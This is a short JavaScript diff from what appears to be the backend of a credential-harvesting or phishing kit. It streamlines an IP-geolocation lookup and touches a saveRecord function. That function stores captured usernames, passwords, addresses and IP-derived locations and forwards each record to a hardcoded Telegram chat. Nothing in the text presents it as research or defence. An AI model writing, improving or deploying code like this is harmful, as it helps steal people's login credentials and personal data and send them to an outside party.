@@ -39,20 +39,16 @@ const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown Location';
-    const services = [
-        `https://ipapi.co/${ip}/json/`,
-        `https://freeipapi.com/api/json/${ip}`,
-        `http://ip-api.com/json/${ip}`
-    ];
-    for (const url of services) {
-        try {
-            const res = await fetch(url, { timeout: 6000 });
-            const data = await res.json();
-            if (data.city || data.country_name) {
-                return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
-            }
-        } catch (e) {}
-    }
+
+    try {
+        // Faster primary service
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 4000 });
+        const data = await res.json();
+        if (data.city || data.country) {
+            return `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown Location';
+        }
+    } catch (e) {}
+
     return 'Unknown Location';
 }
 
@@ -94,7 +90,6 @@ async function saveRecord(type, username = null, password = null, address = null
 
         console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
-        // Send notification immediately for every activity
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
